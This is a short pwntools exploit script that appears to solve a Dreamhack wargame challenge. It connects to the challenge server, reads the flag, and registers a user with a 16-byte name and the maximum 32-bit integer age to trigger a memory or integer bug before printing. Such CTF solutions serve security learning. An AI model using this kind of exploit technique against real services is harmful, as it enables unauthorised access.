from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 23745
r = remote(HOST, PORT)

def join(name, age):
    r.sendlineafter(b'> ', b'1')
    r.sendafter(b'Name: ', name)
    r.sendlineafter(b'Age: ', str(age).encode())

def read_flag():
    r.sendlineafter(b'> ', b'3')

def prnt():
    r.sendlineafter(b'> ', b'2')

read_flag()
join(b'A'*16, 2147483647)
prnt()
r.interactive()